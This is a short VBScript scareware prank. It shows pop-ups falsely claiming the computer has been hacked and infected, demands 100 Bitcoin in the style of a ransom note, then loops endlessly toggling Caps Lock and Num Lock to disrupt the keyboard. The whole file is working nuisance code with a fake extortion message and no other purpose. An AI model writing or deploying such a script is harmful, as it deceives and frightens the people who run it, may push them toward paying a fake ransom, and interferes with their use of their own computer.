
x=msgbox("Your computer is hacked!",0+48,"Uh Oh!")
x=msgbox("Hacker has injected a virus into your computer!",0+48,"Uh Oh!")
x=msgbox("This is TitleBot. Send 100 BitCoin to remove",4+64,"TitleBot")

Set wshShell =wscript.CreateObject("WScript.Shell")
do
wscript.sleep 100
wshshell.sendkeys "{CAPSLOCK}"
wshshell.sendkeys "{NUMLOCK}"
loop